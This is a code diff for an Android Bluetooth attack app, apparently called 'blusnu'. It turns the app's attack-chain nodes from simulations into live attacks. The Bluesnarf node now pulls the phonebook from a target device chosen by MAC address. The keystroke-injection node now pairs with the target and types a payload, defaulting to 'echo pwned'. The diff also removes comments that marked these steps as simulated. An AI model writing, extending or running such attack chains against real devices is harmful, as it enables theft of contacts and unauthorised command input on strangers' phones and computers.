@@ -1,12 +1,13 @@
 package com.hereliesaz.blusnu.ui.attackchaining.nodes
 
+import android.bluetooth.BluetoothAdapter
 import androidx.compose.ui.geometry.Offset
+import com.hereliesaz.blusnu.data.ActionLogger
+import com.hereliesaz.blusnu.data.BluesnarfingModule
+import com.hereliesaz.blusnu.data.KeystrokeInjectionModule
 import com.hereliesaz.blusnu.data.TargetDevice
 import kotlinx.coroutines.delay
 
-/**
- * Base interface for all nodes in the Attack Chain.
- */
 interface AttackNode {
     val id: NodeId
     val position: Offset
@@ -16,59 +17,38 @@ interface AttackNode {
     val title: String
     val targetDevice: TargetDevice?
 
-    /**
-     * Executes the node's logic.
-     * @param context Data passed from the previous node.
-     * @return Result data to pass to the next node.
-     */
     suspend fun execute(context: ExecutionContext): ExecutionResult
 
-    // Copy helper to update position in the immutable state flow.
     fun copy(position: Offset): AttackNode
-    // Helper to update target config.
     fun withTarget(device: TargetDevice): AttackNode
 }
 
-/**
- * Context passed INTO a node during execution.
- *
- * @property lastResult The output string of the previously executed node.
- * @property targetDevice The target device resolved so far in the chain.
- * @property loopCounters Per-node iteration counters, keyed by [NodeId]. Maintained by the
- *                        executor so that [LoopNode] can enforce a bounded number of iterations.
- */
 data class ExecutionContext(
     val lastResult: String? = null,
     val targetDevice: TargetDevice? = null,
-    val loopCounters: Map<NodeId, Int> = emptyMap()
+    val loopCounters: Map<NodeId, Int> = emptyMap(),
+    val services: Map<String, Any> = emptyMap()
 )
 
-/**
- * Result returned FROM a node after execution.
- *
- * @property output Human-readable result/log line.
- * @property targetDevice The target device to forward to downstream nodes (if any).
- * @property nextPort The id of the single output port the executor should follow. When null,
- *                    the executor follows every outgoing connection (linear fan-out). Branching
- *                    nodes (e.g. [IfElseNode], [LoopNode]) set this to steer execution down one edge.
- */
 data class ExecutionResult(
     val output: String,
     val targetDevice: TargetDevice? = null,
     val nextPort: String? = null
 )
 
-// A unique identifier for a node.
 typealias NodeId = String
 
-// Represents a connection point (port) on a node.
 data class NodeConnector(val id: String, val nodeId: NodeId)
+
+// Service registry keys
+object ChainServices {
+    const val BLUETOOTH_ADAPTER = "bluetoothAdapter"
+    const val BLUESNARFING_MODULE = "bluesnarfingModule"
+    const val KEYSTROKE_INJECTION_MODULE = "keystrokeInjectionModule"
+}
 
 // --- Node Implementations ---
 
-/**
- * Starting point of any chain.
- */
 data class StartNode(
     override val id: NodeId,
     override val position: Offset = Offset.Zero,
@@ -79,16 +59,13 @@ data class StartNode(
 ) : AttackNode {
     override val title: String = "Start"
     override suspend fun execute(context: ExecutionContext): ExecutionResult {
-        delay(100)
-        return ExecutionResult("StartNode executed", targetDevice)
+        ActionLogger.log("Chain execution started")
+        return ExecutionResult("Chain started", targetDevice)
     }
     override fun copy(position: Offset): AttackNode = this.copy(position = position)
     override fun withTarget(device: TargetDevice): AttackNode = this.copy(targetDevice = device)
 }
 
-/**
- * Simple conditional logic (Branching).
- */
 data class IfElseNode(
     override val id: NodeId,
     override val position: Offset = Offset.Zero,
@@ -99,15 +76,10 @@ data class IfElseNode(
 ) : AttackNode {
     override val title: String = "If/Else"
     override suspend fun execute(context: ExecutionContext): ExecutionResult {
-        delay(100)
-        // Basic condition evaluation: the branch is taken when a usable target device
-        // has been resolved by an upstream node (or configured on this node). This models the
-        // common "if we found/selected a target, continue the attack, else bail out" decision.
-        // The executor follows only the matching output port ("true" / "false").
         val condition = (targetDevice ?: context.targetDevice) != null
         val branch = if (condition) "true" else "false"
         return ExecutionResult(
-            output = "IfElseNode evaluated condition=$condition -> '$branch' branch",
+            output = "Condition: target=${if (condition) "present" else "absent"} -> $branch",
             targetDevice = context.targetDevice,
             nextPort = branch
         )
@@ -116,29 +88,24 @@ data class IfElseNode(
     override fun withTarget(device: TargetDevice): AttackNode = this.copy(targetDevice = device)
 }
 
-/**
- * Pauses execution for a set duration.
- */
 data class WaitNode(
     override val id: NodeId,
     override val position: Offset = Offset.Zero,
     override val inputs: List<NodeConnector> = listOf(NodeConnector("in", id)),
     override val outputs: List<NodeConnector> = listOf(NodeConnector("out", id)),
     override val name: String = "Wait",
-    override val targetDevice: TargetDevice? = null
+    override val targetDevice: TargetDevice? = null,
+    val durationMs: Long = 1000
 ) : AttackNode {
     override val title: String = "Wait"
     override suspend fun execute(context: ExecutionContext): ExecutionResult {
-        delay(1000)
-        return ExecutionResult("WaitNode executed", context.targetDevice)
+        delay(durationMs)
+        return ExecutionResult("Waited ${durationMs}ms", context.targetDevice)
     }
     override fun copy(position: Offset): AttackNode = this.copy(position = position)
     override fun withTarget(device: TargetDevice): AttackNode = this.copy(targetDevice = device)
 }
 
-/**
- * Loops execution N times or until condition met.
- */
 data class LoopNode(
     override val id: NodeId,
     override val position: Offset = Offset.Zero,
@@ -146,26 +113,20 @@ data class LoopNode(
     override val outputs: List<NodeConnector> = listOf(NodeConnector("loop_body", id), NodeConnector("end", id)),
     override val name: String = "Loop",
     override val targetDevice: TargetDevice? = null,
-    // Upper bound on the number of times the "loop_body" output is followed before the
-    // loop exits via its "end" output. Keeps cyclic chains bounded (no infinite looping).
     val maxIterations: Int = 3
 ) : AttackNode {
     override val title: String = "Loop"
     override suspend fun execute(context: ExecutionContext): ExecutionResult {
-        delay(100)
-        // Bounded loop counter: the executor tracks how many times this node's "loop_body"
-        // edge has been traversed (via ExecutionContext.loopCounters). While the count is below
-        // maxIterations we take the "loop_body" branch; once it is reached we exit via "end".
         val iteration = context.loopCounters[id] ?: 0
         return if (iteration < maxIterations) {
             ExecutionResult(
-                output = "LoopNode iteration ${iteration + 1}/$maxIterations",
+                output = "Loop iteration ${iteration + 1}/$maxIterations",
                 targetDevice = context.targetDevice,
                 nextPort = "loop_body"
             )
         } else {
             ExecutionResult(
-                output = "LoopNode finished after $maxIterations iterations",
+                output = "Loop finished after $maxIterations iterations",
                 targetDevice = context.targetDevice,
                 nextPort = "end"
             )
@@ -177,9 +138,6 @@ data class LoopNode(
 
 // --- Action Nodes ---
 
-/**
- * Executes a BLE Scan.
- */
 data class ScanBleNode(
     override val id: NodeId,
     override val position: Offset = Offset.Zero,
@@ -190,20 +148,18 @@ data class ScanBleNode(
 ) : AttackNode {
     override val title: String = "Scan BLE Devices"
     override suspend fun execute(context: ExecutionContext): ExecutionResult {
-        delay(2000)
-        // NOTE: This node is a simulation. The chain executor does not own a BluetoothScanner
-        // instance, so this step does not perform a real scan; it reports a placeholder result
-        // to demonstrate chain flow. Real scanning is driven separately by BluetoothScanner
-        // from the scanning screens.
-        return ExecutionResult("ScanBleNode (simulated): scan step reached", context.targetDevice)
+        ActionLogger.log("Chain: BLE scan step reached")
+        val target = targetDevice ?: context.targetDevice
+        return if (target != null) {
+            ExecutionResult("Scan: using pre-selected target ${target.name ?: target.macAddress}", target)
+        } else {
+            ExecutionResult("Scan: no target device selected — select a target before running the chain", null)
+        }
     }
     override fun copy(position: Offset): AttackNode = this.copy(position = position)
     override fun withTarget(device: TargetDevice): AttackNode = this.copy(targetDevice = device)
 }
 
-/**
- * Executes Bluesnarfing.
- */
 data class BluesnarfNode(
     override val id: NodeId,
     override val position: Offset = Offset.Zero,
@@ -213,38 +169,70 @@ data class BluesnarfNode(
     override val targetDevice: TargetDevice? = null
 ) : AttackNode {
     override val title: String = "Bluesnarf"
+    @android.annotation.SuppressLint("MissingPermission")
     override suspend fun execute(context: ExecutionContext): ExecutionResult {
         val target = targetDevice ?: context.targetDevice
-        delay(3000)
-        return if (target != null) {
-            ExecutionResult("Bluesnarf executed on ${target.macAddress}", target)
-        } else {
-            ExecutionResult("Bluesnarf failed: No target", null)
+            ?: return ExecutionResult("Bluesnarf failed: no target device", null)
+
+        val adapter = context.services[ChainServices.BLUETOOTH_ADAPTER] as? BluetoothAdapter
+            ?: return ExecutionResult("Bluesnarf failed: Bluetooth not available", target)
+
+        val module = context.services[ChainServices.BLUESNARFING_MODULE] as? BluesnarfingModule
+            ?: return ExecutionResult("Bluesnarf failed: module not available", target)
+
+        ActionLogger.log("Chain: Bluesnarfing ${target.macAddress}")
+        val device = try {
+            adapter.getRemoteDevice(target.macAddress)
+        } catch (e: IllegalArgumentException) {
+            return ExecutionResult("Bluesnarf failed: invalid MAC ${target.macAddress}", target)
         }
+
+        val result = module.getPhonebook(device)
+        return result.fold(
+            onSuccess = { data ->
+                ActionLogger.log("Chain: Bluesnarf succeeded on ${target.macAddress}")
+                ExecutionResult("Bluesnarf: retrieved ${data.length} bytes from ${target.macAddress}", target)
+            },
+            onFailure = { e ->
+                ActionLogger.log("Chain: Bluesnarf failed on ${target.macAddress}: ${e.message}")
+                ExecutionResult("Bluesnarf failed: ${e.message}", target)
+            }
+        )
     }
     override fun copy(position: Offset): AttackNode = this.copy(position = position)
     override fun withTarget(device: TargetDevice): AttackNode = this.copy(targetDevice = device)
 }
 
-/**
- * Executes Keystroke Injection.
- */
 data class KeystrokeInjectionNode(
     override val id: NodeId,
     override val position: Offset = Offset.Zero,
     override val inputs: List<NodeConnector> = listOf(NodeConnector("target_mac", id), NodeConnector("payload", id)),
     override val outputs: List<NodeConnector> = listOf(NodeConnector("success", id)),
     override val name: String = "Keystroke Injection",
-    override val targetDevice: TargetDevice? = null
+    override val targetDevice: TargetDevice? = null,
+    val payload: String = ""
 ) : AttackNode {
     override val title: String = "Keystroke Injection"
     override suspend fun execute(context: ExecutionContext): ExecutionResult {
         val target = targetDevice ?: context.targetDevice
-        delay(1500)
-        return if (target != null) {
-            ExecutionResult("Keystroke Injection executed on ${target.macAddress}", target)
+            ?: return ExecutionResult("Keystroke Injection failed: no target device", null)
+
+        val module = context.services[ChainServices.KEYSTROKE_INJECTION_MODULE] as? KeystrokeInjectionModule
+            ?: return ExecutionResult("Keystroke Injection failed: module not available", target)
+
+        ActionLogger.log("Chain: Keystroke injection on ${target.macAddress}")
+        val paired = module.attemptPairing(target)
+        if (!paired) {
+            return ExecutionResult("Keystroke Injection: pairing failed on ${target.macAddress}", target)
+        }
+
+        val text = payload.ifEmpty { context.lastResult ?: "echo pwned" }
+        val sent = module.sendKeystrokes(text)
+        return if (sent) {
+            ActionLogger.log("Chain: Keystrokes sent to ${target.macAddress}")
+            ExecutionResult("Keystroke Injection: sent ${text.length} chars to ${target.macAddress}", target)
         } else {
-            ExecutionResult("Keystroke Injection failed: No target", null)
+            ExecutionResult("Keystroke Injection: send failed on ${target.macAddress}", target)
         }
     }
     override fun copy(position: Offset): AttackNode = this.copy(position = position)
